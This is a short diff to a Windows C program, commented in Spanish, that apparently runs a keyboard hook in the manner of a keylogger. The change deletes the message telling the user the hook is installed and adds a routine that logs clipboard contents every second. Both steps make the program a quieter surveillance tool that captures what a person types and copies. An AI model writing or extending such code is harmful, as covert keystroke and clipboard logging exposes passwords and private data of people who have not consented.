@@ -55,11 +55,13 @@
 			return 1;
 		}
 		
-		printf("Hook instalado pulsa ESC para salir\n");
 		// Loop principal para manterner el hook activo
 		MSG msg;
 		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, "Global\\WinkeyTerminateEvent");
 
+		// Para controlar el tiempo del chequeo del portapapeles (tiempo en ms desde que incio windows)
+		DWORD lastClipboardCheck = GetTickCount();
+		
 		while(TRUE)
 		{
 			// Procesar mensajes (incluyendo eventos del hook)
@@ -73,6 +75,12 @@
 
 			if (WaitForSingleObject(hEvent, 10) == WAIT_OBJECT_0) {
 				break;
+			}
+
+			// Comprobar el portapapeles cada 1000 ms (1 segundo)
+			if (GetTickCount() - lastClipboardCheck > 1000) {
+				LogClipboardIfChanged();
+				lastClipboardCheck = GetTickCount(); // Reiniciamos contador
 			}
 
 			Sleep(10);
